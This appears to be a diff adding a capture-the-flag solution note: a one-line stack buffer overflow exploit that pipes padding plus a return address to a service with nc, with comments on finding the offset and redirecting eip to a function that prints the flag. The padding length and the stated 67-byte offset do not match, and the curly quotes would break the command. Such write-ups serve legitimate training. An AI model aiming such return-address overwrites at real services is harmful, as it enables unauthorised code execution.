@@ -1,0 +1,7 @@
+python -c 'print “A”*63 + “\xcc\x86\x04\x08”’ | nc addr port
+
+# Used trial and error to find 67 bytes overflowed to a return address
+# that got loaded into eip. Used disassembler to see there was a method that 
+# called cat ./flag and got its address 0x080486cc . Overflowed eip with address
+# of the cat ./flag method. I think this was supposed to be done differently 
+# because of the address given in the start.
